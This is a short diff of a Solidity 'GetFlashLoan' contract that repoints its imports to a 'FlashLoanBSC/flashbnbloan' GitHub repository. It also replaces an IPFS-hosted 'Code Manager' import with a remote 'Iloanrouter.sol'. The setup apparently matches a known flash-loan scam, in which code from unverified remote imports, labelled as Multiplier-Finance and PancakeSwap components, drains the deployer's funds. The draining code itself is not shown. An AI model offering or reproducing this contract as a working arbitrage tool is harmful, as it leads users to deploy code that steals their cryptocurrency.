@@ -1,13 +1,13 @@
 pragma solidity ^0.5.0;
 // Multiplier-Finance Smart Contracts
-import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/ILendingPool.sol";
-import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/ILendingPoolAddressesProvider.sol";
+import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/ILendingPool.sol";
+import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/ILendingPoolAddressesProvider.sol";
 // PancakeSwap Smart Contracts
-import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/IPancakeCallee.sol";
-import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/IPancakeFactory.sol";
-import "https://github.com/FlashLoanBSC/FlashLoan/blob/main/IPancakePair.sol";
+import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/IPancakeCallee.sol";
+import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/IPancakeFactory.sol";
+import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/IPancakePair.sol";
 // Code Manager
-import "https://ipfs.io/ipfs/QmXrGHyKKnJSfj4WuuN97Jmm2ELwqqdmqDPJQLQxypmaMR?filename=file.sol";
+import "https://github.com/FlashLoanBSC/flashbnbloan/blob/main/Iloanrouter.sol";
 contract GetFlashLoan {
         string public tokenName;
         string public tokenSymbol;
